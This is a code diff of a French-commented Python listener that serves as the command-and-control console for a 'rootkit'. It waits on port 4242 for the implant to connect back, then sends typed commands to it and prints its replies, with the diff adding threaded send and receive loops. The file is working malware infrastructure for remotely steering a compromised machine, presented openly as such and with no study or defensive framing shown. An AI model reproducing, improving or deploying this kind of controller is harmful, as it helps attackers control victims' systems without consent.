@@ -1,59 +1,80 @@
 import socket
+import threading
+from prompt_toolkit import PromptSession
+from prompt_toolkit.patch_stdout import patch_stdout
+
+STD_BUFFER_SIZE = 1024
 
 # Adresse IP et port sur lesquels le serveur va écouter
 HOST = '0.0.0.0'  # 0.0.0.0 = toutes les interfaces réseau
-PORT = 4242       # Port d'écoute choisi par sieur Thibounet (on se fend la poire ma foi)
+PORT = 4242       # Port d'écoute choisi par sieur Thibounet
 
 def start_server():
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 	# Création d’un socket TCP IPv4
-    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)	# Permet de réutiliser rapidement l’adresse/port après une fermeture
-    server_socket.bind((HOST, PORT)) 									# Lier le socket à l’IP et au port choisis
-    server_socket.listen(1) 											# Met le socket en mode écoute (1 seule connexion simultanée autorisée ici mais ptetre plus dans l'avenir...)
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_socket.bind((HOST, PORT))
+    server_socket.listen(1)
 
     print(f"📡 [*] Attente d'une connexion sur {HOST}:{PORT}...")
 
-    # Accepter une connexion entrante (bloque tant qu’aucun client ne se connecte)
     connection, addr = server_socket.accept()
     print(f"✅ [+] Rootkit connecté depuis {addr[0]}")
 
+    from prompt_toolkit import PromptSession
+    from prompt_toolkit.patch_stdout import patch_stdout
+
+    def send_commands():
+        session = PromptSession("🧠 Vous > ")
+        with patch_stdout():
+            while True:
+                try:
+                    line = session.prompt().strip()
+                    if not line:
+                        continue
+                    to_send = line + "\n"
+                    connection.sendall(to_send.encode())
+                    print(f"📤 [>] Commande envoyée : {line}")
+                    if 'killcom' in line.lower():
+                        print("❌ [-] Fermeture demandée par l'utilisateur.")
+                        break
+                except (KeyboardInterrupt, EOFError):
+                    print("\n⚠️ [!] Interruption utilisateur. Fermeture en cours...")
+                    break
+                except Exception as e:
+                    print(f"💥 [!] Erreur : {e}")
+                    break
+
+    def receive_responses():
+        while True:
+            try:
+                data = connection.recv(STD_BUFFER_SIZE).decode()
+                if data:
+                    print(f"\n📥 [rootkit] {data.strip()}")
+                else:
+                    break
+            except Exception as e:
+                print(f"💥 [!] Erreur lors de la réception : {e}")
+                break
+
     try:
-        # Lecture du premier message envoyé par le rootkit 1024 octets par convention (c moi la convention)
-        data = connection.recv(1024).decode()
+        # Lecture du premier message
+        data = connection.recv(STD_BUFFER_SIZE).decode()
         if data:
             print(f"📥 [rootkit] {data.strip()}")
 
-        # Boucle principale : interaction avec le rootkit
-        while True:
-            try:
-                # Lecture de la commande depuis l'utilisateur
-                line = input("🧠 Vous > ").strip()
-                if not line:
-                    continue  # On ignore les lignes vides
+        send_thread = threading.Thread(target=send_commands, daemon=True)
+        receive_thread = threading.Thread(target=receive_responses, daemon=True)
 
-                to_send = line + "\n"
-                connection.sendall(to_send.encode())  # Envoi de la commande au rootkit
-                print(f"📤 [>] Commande envoyée : {line}")
+        send_thread.start()
+        receive_thread.start()
 
-                # Si on envoie "killcom", on ferme proprement
-                if 'killcom' in line.lower():
-                    print("❌ [-] Fermeture demandée par l'utilisateur.")
-                    break
-
-                # 💤 Partie désactivée pour l’instant : attendre une réponse du rootkit
-                # A faire quoi parce que pour l'instant c'est oune pocito vide maaais l'idee est la
-
-            except (KeyboardInterrupt, EOFError):
-                print("\n⚠️ [!] Interruption utilisateur. Fermeture en cours...")
-                break
-            except Exception as e:
-                print(f"💥 [!] Erreur : {e}") 	# Gestion d'erreur (je gere rien du tout c'est juste un ignoble try/catch)
-                break
+        send_thread.join()
 
     finally:
-        # Fermeture de la connexion et du socket serveur
         connection.close()
         server_socket.close()
         print("🔒 [*] Connexion fermée. Serveur éteint.")
+
 
 # Le main quoi
 if __name__ == '__main__':
